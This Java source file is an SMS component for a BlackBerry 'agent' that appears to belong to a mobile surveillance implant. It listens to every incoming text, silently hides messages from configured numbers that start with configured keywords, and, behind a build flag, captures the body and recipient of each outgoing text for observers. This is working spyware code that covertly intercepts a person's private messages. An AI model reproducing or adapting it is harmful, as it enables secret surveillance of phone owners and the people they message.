//#preprocess
package blackberry.agent.sms;

import java.io.IOException;
import java.util.Enumeration;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.io.DatagramBase;
import net.rim.device.api.io.SmsAddress;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.system.SMSPacketHeader;
import net.rim.device.api.ui.component.EditField;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;

import blackberry.interfaces.SmsObserver;
import blackberry.utils.Check;
import blackberry.utils.Utils;

//#ifdef SMS_HIDE
public class SmsListener46 extends SmsListener implements SendListener {
//#else
public class SmsListener46 extends SmsListener {  
//#endif
    private static final long GUID = 0xe78b740082783263L;
    // Statics ------------------------------------------------------------------
    private static String _openString = "sms://:0"; // See Connector implementation notes.
    // Members ------------------------------------------------------------------
    private EditField _sendText;
    private EditField _address; // A phone number for outbound SMS messages.
    private EditField _status;
    private ListeningThread _listener;
    //private SendThread _sender;
    private StringBuffer _statusMsgs = new StringBuffer(); // Cached for improved performance.
    private MessageConnection _mc;
    private boolean _stop = false;

    //#ifdef DEBUG
    static Debug debug = new Debug("SmsListener", DebugLevel.VERBOSE);
    //#endif

    private static SmsListener46 instance;

    private SmsListener46() {
    }

    /*
     * public void setMessageAgent(final MessageAgent messageAgent) {
     * this.messageAgent = messageAgent; }
     */

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }

    public synchronized static SmsListener46 getInstance() {

        if (instance == null) {
            instance = (SmsListener46) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final SmsListener46 singleton = new SmsListener46();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    public boolean isRunning() {
        return _listener != null;
    }

    protected synchronized void start() {
        _listener = new ListeningThread();
        _listener.start();
        Utils.sleep(1000);
        //#ifdef DEBUG
        debug.trace("start: add sendListener");
        //#endif
        
        //#ifdef SMS_HIDE
        SMS.addSendListener(this);
        //#endif
    }

    protected synchronized void stop() {
        _listener.stop();
        _listener = null;
        //#ifdef DEBUG
        debug.trace("stop: remove sendListener");
        //#endif
        
        //#ifdef SMS_HIDE
        SMS.removeSendListener(this);
        //#endif
    }

    // Inner Classes ------------------------------------------------------------
    private class ListeningThread extends Thread {
        public synchronized void stop() {
            _stop = true;

            try {
                if (_mc != null) {
                    // Close the connection so the thread will return.
                    _mc.close();
                }
            } catch (IOException e) {
                System.err.println(e.toString());
            }
        }

        synchronized boolean dispatch(byte[] message, String address,
                boolean hidden) {

            final int size = smsObservers.size();
            boolean hide = false;

            for (int i = 0; i < size; i++) {
                final SmsObserver observer = (SmsObserver) smsObservers
                        .elementAt(i);
                //#ifdef DEBUG
                debug.trace("notify: " + observer);
                //#endif

                hide |= observer.onNewSms(message, address, true);
            }
            //#ifdef DBC
            Check.requires(hide == hidden, "mismatch hide!");
            //#endif

            return true;
            //return saveLog(message, incoming);
        }

        public void run() {
            try {
                debug.trace("run");
                _mc = (MessageConnection) Connector.open(_openString); // Closed by the stop() method.
                DatagramConnection _dc = (DatagramConnection) _mc;
                debug.trace("mc: " + _mc);
                for (;;) {
                    if (_stop) {
                        debug.trace("stop");
                        return;
                    }

                    debug.trace("datagram");
                    Datagram d = _dc.newDatagram(_dc.getMaximumLength());

                    debug.trace("receive");
                    _dc.receive(d);

                    byte[] bytes = d.getData();
                    String address = d.getAddress();
                    String msg = new String(bytes);

                    boolean hidden = hide(address, msg);
                    if (hidden) {
                        DatagramBase dbase = (DatagramBase) d;
                        SmsAddress smsAddress = (SmsAddress) dbase
                                .getAddressBase();
                        SMSPacketHeader header = smsAddress.getHeader();

                        header.setMessageWaitingType(SMSPacketHeader.WAITING_INDICATOR_TYPE_OTHER);
                        debug.trace("hidden");
                    }

                    dispatch(bytes, address, hidden);

                    //Message m = _mc.receive();
                    //receivedSmsMessage(m);
                }
            } catch (Exception e) {
                // Likely the stream was closed.
                System.err.println(e.toString());
                e.printStackTrace();
            }
        }

        private boolean hide(String address, String msg) {
            Enumeration hiddens = hiddenRequest.elements();
            while (hiddens.hasMoreElements()) {
                String[] pair = (String[]) hiddens.nextElement();
                String number = pair[0];
                String text = pair[1];
                if (address.endsWith(number)) {
                    //#ifdef DEBUG
                    debug.trace("hide: good number");
                    //#endif
                    if (msg.toLowerCase().startsWith(text)) {
                        //#ifdef DEBUG
                        debug.trace("hide: good message");
                        //#endif
                        return true;
                    }
                }
            }

            //#ifdef DEBUG
            debug.trace("don't have to hide this sms");
            //#endif
            return false;
        }
    }

    /**
     * ESECUZIONE FUORI CONTEST
     */
    public boolean sendMessage(Message msg) {
        //#ifdef DEBUG
        init();
        //#endif
        debug.trace("notifyOutgoingMessage");

        String body = "";
        if (msg instanceof TextMessage) {
            //#ifdef DEBUG
            debug.trace("sendMessage: text message");
            //#endif
            TextMessage tm = (TextMessage) msg;
            body = tm.getPayloadText();
        }

        SmsListener46 smsListener = SmsListener46.getInstance();

        final int size = smsListener.smsObservers.size();
        boolean hide = false;
        for (int i = 0; i < size; i++) {

            final SmsObserver observer = (SmsObserver) smsListener.smsObservers
                    .elementAt(i);
            //#ifdef DEBUG
            debug.trace("notify: " + observer);
            //#endif

            observer.onNewSms(body.getBytes(), msg.getAddress(), false);
        }

        return true;
    }

}